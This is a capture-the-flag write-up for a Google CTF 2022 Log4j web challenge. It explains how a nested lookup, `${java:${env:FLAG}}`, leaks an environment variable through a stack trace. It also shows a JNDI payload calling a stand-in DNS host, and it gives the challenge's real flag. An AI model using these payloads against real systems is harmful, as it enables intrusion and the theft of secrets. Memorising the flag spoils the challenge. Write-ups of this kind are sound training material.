# Log4j Challenge Writeup
## Files
* Challenge folder: https://github.com/google/google-ctf/tree/master/2022/web-log4j

## Flag Location
* environment variable `FLAG` or `${env:FLAG}`

## Background Info
This challenge is based on the log4j vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228))  that occured late 2021 but made a bit more complicated.

There are only two major directories within the repo (chatbot and server). Within these directories the only important files to investigate are the **App.java** (located at chatbot/src/main/java/com/google/app/App.java) and **app.py** (located server/app.py). These two files are the main logic and server taking in our input for the web challenge respectively.

The architecture is quite straight forward. But I'll break it down quickly. The **app.py** server logic that takes our input in. There is very little validation checks here, basically just making sure that you are submitting something. The input then can passed to the **App.java** file where the main logic begins. By this point your input has been split by a space and only the first index in the array matters as this is treated as *args* (for **App.java***) and is the only value that gets logged within **App.java**. For example, if you inputed `hi asdf` only `hi` gets logged within the log4j logger. So it is pretty important that we get the injection correct here. This is because the vulnerable code is located in **App.java** and can be seen here `LOGGER.info("msg: {}", args);`. 

**Please note:** that any error message you see on the web page doesn't matter as this vulnerable log code occurs before this happens

## Solution
Start of by doing this locally as seeing the logging occur server side help quite a bit with the exploitation. To get the container running locally after downloading the file run the following command: `docker run -it --cap-add=SYS_ADMIN --read-only --security-opt seccomp=unconfined -p 127.0.0.1:1337:1337  $(docker build -q .)`

In your browser, go to http://127.0.0.1:1337.

Try a standard jndi payload such as `
${jndi:dns://aeutbj.example.com/ext}
`
 
Observe to see that the logger doesn't execute this payload since JNDI isn't enabled within this code.  In the screenshot below I showed what the logger outputted, however, if JDNI was enabled the logger would return something similar to `Send LDAP reference result for a redirecting to http://aeutbj.example.com`.


Since JNDI isn't enabled we aren't able to extract the flag out via a webhook which makes it a bit more hard.

However, this means that we only have the log4j lookup features to attempt to get the flag. The log4j lookup features are documented pretty well [here](https://logging.apache.org/log4j/2.x/manual/lookups.html) and [here](https://logging.apache.org/log4j/2.x/manual/configuration.html). Lookups in log4j are basically a way to add values to the log4j configurations but there are some default ones available.

Try a basic lookup payload such as `${java:version}` and we observe in the log that the payload isn't reflected but we are able to see `Java version 11.0.15` as seen in the screenshot below.

You then can try to see if we can see the flag in the log server side by injection the payload `${env:FLAG}` and we see CTF{REDACTED}.

That means lookup is a success but the problem is that this isn't reflected on the webapge meaning we won't be able to see the flag. We have to force it out.

After a bit of fuzzing and reading the documentation, I learnt that you can generate an error by providing an attribute that doesn't exists for a lookup. For example, if I were to submit `${java:g22}` it will show a stack trace on the webpage as seen in the screenshot below.

I saw `java:g22` within the stack trace and got to thinking what would happen if I repalced the `g22` above with `${env:FLAG}` to produce the payload: `${java:${env:FLAG}}`. From that payload, I was able to see the `CTF{REDACTED}` as seen in the screenshot below.


Submitting this into the actual challenge got me the flag `CTF{d95528534d14dc6eb6aeb81c994ce8bd}` as seen in the screenshot below.
